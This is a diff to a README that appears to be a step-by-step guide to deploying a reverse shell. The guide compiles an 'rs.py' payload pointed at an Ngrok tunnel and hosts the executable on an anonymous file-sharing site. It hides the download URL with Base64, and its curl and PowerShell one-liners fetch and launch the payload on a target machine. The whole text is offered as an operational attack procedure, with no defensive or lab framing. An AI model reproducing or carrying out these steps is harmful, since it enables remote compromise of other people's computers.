@@ -20,8 +20,8 @@ you will need [Python](https://www.python.org/downloads/), [Netcat](https://eter
 5. **Download and Edit Python File**
    - [Download the Python file](https://catlitter.minoa.cat/api/view/bc52bb227eea93ac2dd0.zip) and in rs.py edit the IP and port to be the Ngrok one.
    - (Must have python installed) run windows compile.bat and only if you have wsl setup you can run linux compile.bat and the files that show up are compilex executables.
-   - Upload the compiled files to [wormhole.app](https://wormhole.app/)!
-   - Once finished uploading refresh, click download, then go into your downlaod manager and copy the direct download link.
+   - Upload the compiled files to [anontransfer.com](https://anontransfer.com/)!
+   - Once finished uploading goto the download url, click download, then go into your downlaod manager and copy the direct download link.
 
 6. **Convert URL to Base64**
    - Use [base64encode.org](https://www.base64encode.org/) to convert the URL for whatever file to Base64.
@@ -31,19 +31,18 @@ you will need [Python](https://www.python.org/downloads/), [Netcat](https://eter
    - While in, use the command below, replacing `{BASE64 GOES HERE}` with the Base64 link:
 Linux:
 `curl -O $(echo "{BASE64 GOES HERE}" | base64 --decode)`
-`chmod +x {OUTPUT FILE}`
- `./{OUTPUT FILE}`
-
+###
 Windows:
-`Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{BASE64 GOES HERE}"))) -OutFile ([System.IO.Path]::GetFileName(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{BASE64 GOES HERE}")))))`
+`powershell -Command "Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{BASE64 GOES HERE}'))) -OutFile ([System.IO.Path]::GetFileName(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{BASE64 GOES HERE}')))))"`
 
+###
 
 8. **Run the File**
 Linux:
-`chmod +x {OUTPUT FILE}`
- `./{OUTPUT FILE}`
+`chmod +x {FILENAME}`
+ `./{FILENAME}`
 Windows:
-`start {OUTPUT FILE}`
+`start {FILENAME}`
  - If there are errors, idk..
 
 
